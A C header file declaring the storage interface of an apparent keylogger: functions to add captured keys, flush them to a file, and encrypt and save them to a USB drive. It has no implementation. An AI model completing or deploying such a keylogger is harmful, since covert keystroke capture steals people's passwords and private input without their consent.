#ifndef KEY_LOGGER_STORAGE_H
#define KEY_LOGGER_STORAGE_H

#include <stddef.h>
#include <stdbool.h>

typedef struct KeyLoggerStorage KeyLoggerStorage;

KeyLoggerStorage* key_logger_storage_create(void);
void key_logger_storage_destroy(KeyLoggerStorage* storage);

bool key_logger_storage_add_key(KeyLoggerStorage* storage, const char* key);
bool key_logger_storage_flush_to_file(KeyLoggerStorage* storage, const char* filepath);
bool key_logger_storage_encrypt_and_save_to_usb(KeyLoggerStorage* storage, const char* usb_path);

#endif // KEY_LOGGER_STORAGE_H